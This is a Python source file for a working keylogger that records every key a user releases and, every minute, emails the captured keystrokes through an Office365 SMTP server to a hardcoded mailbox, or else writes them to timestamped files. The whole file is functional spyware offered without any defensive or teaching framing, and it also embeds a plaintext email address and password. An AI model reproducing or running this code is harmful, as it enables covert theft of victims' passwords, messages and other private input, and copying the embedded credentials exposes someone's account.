import keyboard
import smtplib #send mailed report
from threading import Timer
from datetime import datetime   
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import time

SEND_REPORT_EVERY = 60 # report after every minute
EMAIL_ADDRESS="aishiksen03@outlook.com"
EMAIL_PASSWORD="AiShIk.1357#"

class Keylogger:
    def __init__(self,interval,report_method="email"):
        self.interval=interval
        self.report_method=report_method
        self.log=""
        self.start_dt=datetime.now()
        self.end_dt=datetime.now()
        self.is_running=True

    def callback(self,event):
        ##call this back whenever a key is pressed and released
        name=event.name
        if len(name)>1:
            if name=="space":
                name=" "
            elif name=="enter":
                name="[ENTER]\n"
            elif name=="decimal":
                name="."
            else:
                name=name.replace(" ","_")
                name=f"[{name.upper()}]"    
        self.log+=name

    def update_filename(self):
        ##construct a new filename to be identified by the dates
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        ##create a log file the has current keylogs in self.log variable
        ##open the file in write mode
        with open(f"{self.filename}.txt","w") as f:
            print(self.log,file=f)
        print(f"[+]Saved {self.filename}.txt")

    def prepare_mail(self,message):
        ##construct MIME Multipart from a text and send as html and plaintext
        msg=MIMEMultipart("alternative")
        msg["From"]=EMAIL_ADDRESS
        msg["To"]=EMAIL_ADDRESS
        msg["Subject"]="Keylogger Report"
        html=f"<p>{message}</p>"
        text_part=MIMEText(message,"plain")
        html_part=MIMEText(html,"html")
        msg.attach(text_part)
        msg.attach(html_part)
        return msg.as_string()
    
    def sendmail(self,email,password,message,verbose=1):
        ##manage SMTP connection
        server=smtplib.SMTP(host="smtp.office365.com",port=587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,self.prepare_mail(message))
        server.quit()
        if verbose:
            print(f"{datetime.now()}-Sent an email to {email} containing:  {message}")

    def report(self):
        while self.is_running:  # Keep reporting while the keylogger is running
            if self.log:
                self.end_dt = datetime.now()
                self.update_filename()
                if self.report_method == "email":
                    self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
                elif self.report_method == "file":
                    self.report_to_file()
                self.start_dt = datetime.now()
            self.log = ""
            time.sleep(self.interval)
            # timer = Timer(interval=self.interval, function=self.report)
            # timer.daemon = True
            # timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()}-Started the keylogger")
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    keylogger.start()



